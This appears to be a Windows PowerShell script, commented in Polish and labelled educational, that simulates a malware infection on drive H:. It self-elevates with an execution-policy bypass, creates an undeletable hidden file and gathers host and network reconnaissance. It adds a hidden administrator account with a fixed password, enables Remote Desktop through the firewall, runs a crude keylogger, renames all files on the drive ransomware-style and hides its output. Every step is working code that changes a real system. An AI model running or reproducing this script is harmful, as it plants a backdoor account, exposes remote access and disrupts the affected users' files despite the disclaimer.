# UWAGA: Ten skrypt jest wyłącznie do celów edukacyjnych. Nie uruchamiaj go na systemach produkcyjnych.
# Tworzy "niemożliwe" do usunięcia pliki oraz elementy symulujące złośliwe oprogramowanie.

RequireAdmin() {
    $user = [Security.Principal.WindowsIdentity]::GetCurrent()
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (RequireAdmin)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 1. Tworzenie "niemożliwego do usunięcia" pliku systemowego na dysku H:
$filePath = "H:\!systemfile.sys"
fsutil file createnew $filePath 0 | Out-Null
attrib +s +h +r $filePath
icacls $filePath /deny "Everyone:(D,DC)" /inheritance:r | Out-Null

# 2. Tworzenie pliku info.txt z danymi systemowymi
$infoPath = "H:\info.txt"
$computerInfo = @"
--- DANE SYSTEMOWE ---
Nazwa komputera: $env:COMPUTERNAME
Użytkownicy lokalni:
$((Get-LocalUser | Format-Table Name, Enabled, LastLogon -AutoSize | Out-String))
Adresy IP:
$((Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Format-Table IPAddress, InterfaceAlias -AutoSize | Out-String))
Drzewo sieciowe:
$((net view /all) -join "`n")
"@
Set-Content -Path $infoPath -Value $computerInfo

# 3. Elementy "agresywne" (symulacja złośliwego oprogramowania)
# a. Utworzenie ukrytego konta administratora
net user /add $env:USERNAME`_shadow P@ssw0rd123! /passwordchg:no /comment:"Konto edukacyjne" | Out-Null
net localgroup administrators $env:USERNAME`_shadow /add | Out-Null

# b. Aktywacja zdalnego pulpitu i otwarcie portów
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" | Out-Null

# c. Rejestracja klawiszy (prosta wersja)
$keyloggerScript = {
    $logPath = "H:\keylog.txt"
    while ($true) {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.Keys]::GetValues([System.Windows.Forms.Keys]) | ForEach-Object {
            if ([System.Windows.Forms.Control]::IsKeyLocked($_)) {
                "[SPECJALNY: $_]" | Add-Content -Path $logPath
            }
        }
        Start-Sleep -Seconds 30
    }
}
Start-Job -ScriptBlock $keyloggerScript -Name "KeyLoggerJob"

# d. Szyfrowanie symulacyjne (nie niszczy rzeczywistych danych!)
$demoFiles = Get-ChildItem "H:\" -File | Where-Object {$_.Extension -ne ".sys"}
$demoFiles | ForEach-Object {
    $newName = $_.Name + ".encrypted"
    Rename-Item -Path $_.FullName -NewName $newName
    Set-Content -Path ($_.DirectoryName + "\" + $newName + ".README") -Value "To jest symulacja zaszyfrowanego pliku. W celach edukacyjnych."
}

# 4. Ukrywanie śladów
Set-ItemProperty -Path "H:\info.txt" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
Set-ItemProperty -Path "H:\keylog.txt" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

Write-Host "Operacja zakończona! Pliki dostępne na dysku H:"
Write-Host "UWAGA: Skrypt ma wyłącznie charakter edukacyjny."
